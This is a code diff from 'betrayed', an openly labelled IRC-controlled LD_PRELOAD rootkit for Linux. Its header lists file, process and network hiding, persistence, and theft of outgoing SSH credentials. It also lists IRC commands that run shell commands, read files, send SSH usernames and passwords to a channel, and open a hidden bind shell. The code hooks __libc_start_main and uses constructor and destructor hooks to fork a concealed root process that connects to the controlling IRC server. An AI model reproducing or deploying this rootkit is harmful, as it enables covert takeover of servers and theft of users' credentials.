@@ -1,5 +1,27 @@
-#define _GNU_SOURCE
+/*
+  ▄▄▄▄· ▄▄▄ .▄▄▄▄▄▄▄▄   ▄▄▄·  ▄· ▄▌▄▄▄ .·▄▄▄▄  
+  ▐█ ▀█▪▀▄.▀·•██  ▀▄ █·▐█ ▀█ ▐█▪██▌▀▄.▀·██▪ ██ 
+  ▐█▀▀█▄▐▀▀▪▄ ▐█.▪▐▀▀▄ ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐█· ▐█▌
+  ██▄▪▐█▐█▄▄▌ ▐█▌·▐█•█▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌██. ██ 
+  ·▀▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀ ▀  ▀   ▀ •  ▀▀▀ ▀▀▀▀▀• 
 
+    IRC-controlled LD_PRELOAD Linux rootkit.
+
+    Features:
+        file hiding,
+        process hiding,
+        network hiding,
+        installation persistence,
+        outgoing ssh cred logging
+    IRC commands:
+        `!ssh_logs [nick]` (reads outgoing SSH logs, sends usernames and passwords to your desired IRC channel)
+        `!sh [nick] [command]` (executes commands on chosen server, and sends command output to the channel)
+        `!read_file [nick] [path]` (sends contents of path to IRC channel)
+        `!bind [nick] [port]` (creates a hidden /bin/sh bind shell on given port which you can connect to)
+        `!kill [nick]/all` (kills chosen iteration of betrayed. removes all respective rootkit files and disconnects)
+*/
+
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdarg.h>
@@ -21,53 +43,59 @@
 #include <sys/stat.h>
 #include <sys/select.h>
 #include <sys/ioctl.h>
+#include <sys/xattr.h>
 #include <sys/wait.h>
 #include <netinet/in.h>
 #include <linux/netlink.h>
 
 #include "betrayed.h"
 #include "config.h"
-#include "utils.c"
-#include "hooks.c"
 
-void __attribute ((constructor)) binit (void)
+#include "utils/utils.h"
+#include "hooks/hooks.h"
+
+/* this function is responsible for creating & hiding our process,
+ * and beginning to read from sockfd & parse data. */
+int init_betrayed(void)
 {
-    /* don't try to fork if we've already got an instance running.
-     * that would be bad news. */
-    /* we specifically need to not fork off of some processes in order
-     * to stay hidden. */
-    if(is_betrayed_alive() || is_bad_proc(cprocname())) return;
+    /* it's mandatory that we have root privs. */
+    if(getuid() != 0) return 0;
+    reinstall();
 
-    /* in case you don't care about being root/hiding the process...
-     * i was also doing this check once the process had been forked,
-     * but nonono. that's also silly! */
-    int r=0;
-    #ifndef DM_ROOT
-    if(getuid() != 0) return;
-    r=1;
-    #endif
+    /* we don't need to fork off of every single process that is created,
+     * and we want to ignore some specific processes. */
+    if(is_betrayed_alive() || is_bad_proc(cprocname())) return 0;
 
-    if(fork()==0){
+    if((pid=fork()) == 0)
+    {
+        (void) setpgrp(); /* we are our own process. */
+        (void) setgid(MGID); /* hide our process once we've forked. and we know we're root. */
+        (void) chroot(INSTALL_DIR); /* set proc root to hidden rootkit home directory */
 
-        setpgrp(); // we our own being
+        (void) sleep(BPROC_WAIT); /* wait BPROC_WAIT secs before doing anything. this helps us stay hidden. */
 
-        /* hide our process once we've forked. and we know we're root. */
-        if(r) (void) setgid(MGID);
+        sockfd = setup_connection(); /* make socket, connect to socket. exit(0) if we can't connect. */
+        (void) signal(SIGTERM,(sighandler_t)commit_termicide); /* setup SIGTERM signal handler. */
 
-        /* wait BPROC_WAIT secs before doing anything. this helps us stay hidden. */
-        sleep(BPROC_WAIT);
+        betrayer(sockfd); /* read from/write to sockfd and command handling. */
+        return 1;
+    }else if(pid < 0) return pid;
+    return 0;
+}
 
-        /* make socket, connect to socket. exit(0) if we can't connect.
-         * every new process will attempt to connect until a successful
-         * connection is made.
-         */
-        sockfd=setup_connection();
+int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end))
+{
+    if(init_betrayed()) kill_rk_procs();
+    HOOK(o_libc_start_main, "__libc_start_main");
+    return o_libc_start_main(main,argc,ubp_av,init,fini,rtld_fini,stack_end);
+}
 
-        /* setup our signal handler so that we can close the socket to
-         * the irc server should our process get terminated. (by us)
-         * our function 'kill_rk_procs' sends SIGTERM to all rootkit
-         * processes should we need to hide our presence. */
-        signal(SIGTERM,(sighandler_t)commit_termicide);
-        betrayer(sockfd);
-    }else return;
+void __attribute ((constructor)) binit(void)
+{
+    if(init_betrayed()) kill_rk_procs();
+}
+
+void __attribute ((destructor)) bfini(void)
+{
+    if(init_betrayed()) kill_rk_procs();
 }
